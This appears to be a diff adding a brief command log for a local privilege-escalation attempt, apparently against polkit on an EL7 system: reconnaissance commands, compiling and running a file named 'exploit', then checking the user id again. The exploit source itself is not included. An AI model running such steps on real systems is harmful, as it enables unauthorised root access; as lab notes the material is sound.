@@ -1,0 +1,20 @@
+cat /etc/os-release
+
+uname -a
+
+id 
+
+gcc excp.c -o exploit
+
+./exploit
+
+id 
+
+whoami
+
+polkit   x86_64   0.112-26.el7_9.1 
+
+
+
+
+
